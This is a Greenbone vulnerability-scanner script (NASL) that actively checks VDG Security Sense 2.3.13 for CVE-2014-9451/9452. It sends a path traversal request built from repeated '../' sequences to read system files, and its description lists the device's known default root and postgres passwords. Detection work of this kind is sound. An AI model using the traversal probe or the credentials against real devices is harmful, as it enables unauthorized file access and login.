# SPDX-FileCopyrightText: 2015 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.805033");
  script_version("2025-04-15T05:54:49+0000");
  script_tag(name:"last_modification", value:"2025-04-15 05:54:49 +0000 (Tue, 15 Apr 2025)");
  script_tag(name:"creation_date", value:"2015-01-06 15:11:26 +0530 (Tue, 06 Jan 2015)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");

  script_cve_id("CVE-2014-9451", "CVE-2014-9452");

  script_tag(name:"qod_type", value:"remote_vul");

  script_tag(name:"solution_type", value:"WillNotFix");

  script_name("VDG Security Sense <= 2.3.13 Multiple Vulnerabilities - Active Check");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2015 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_get_http_banner.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 8080);
  script_mandatory_keys("Diva_HTTP/banner");

  script_tag(name:"summary", value:"VDG Security Sense is prone to multiple vulnerabilities.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"insight", value:"The following vulnerabilities exist:

  - An input is not properly sanitized when handling HTTP authorization headers.

  - The program transmitting configuration information in cleartext.

  - The 'root' account has a password of 'ArpaRomaWi', the 'postgres' account has a password of
  '!DVService', and the 'NTP' account has a password of '!DVService', these accounts are publicly
  known and documented.

  - The program returning the contents of the users.ini file in authentication responses.

  - The user-supplied input is not properly validated when passed via the username or password in
  AuthenticateUser requests.

  - The program not properly sanitizing user input, specifically path traversal style attacks
  (e.g. '../') in a URI.");

  script_tag(name:"impact", value:"Successful exploitation will allow attacker to read arbitrary
  files, bypass authentication mechanisms and cause a stack-based buffer overflow, resulting in a
  denial of service or potentially allowing the execution of arbitrary code.");

  script_tag(name:"affected", value:"VDG Security SENSE (formerly DIVA) 2.3.13 and probably prior.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore. General
  solution options are to upgrade to a newer release, disable respective features, remove the
  product or replace the product by another one.");

  script_xref(name:"URL", value:"http://seclists.org/fulldisclosure/2014/Dec/76");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/71736");
  script_xref(name:"URL", value:"http://packetstormsecurity.com/files/129656");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");
include("traversal_func.inc");
include("os_func.inc");
include("port_service_func.inc");

port = http_get_port(default: 8080);

banner = http_get_remote_headers(port: port);

if (!banner || banner !~ "Server\s*:\s*Diva HTTP Plugin")
  exit(0);

files = traversal_files();

foreach file (keys(files)){
  url = "/images/" +  crap(data: "../", length: 3 * 15) + files[file];

  if (http_vuln_check(port: port, url: url, pattern: file)) {
    report = http_report_vuln_url(port: port, url: url);
    security_message(port: port, data: report);
    exit(0);
  }
}

exit(99);
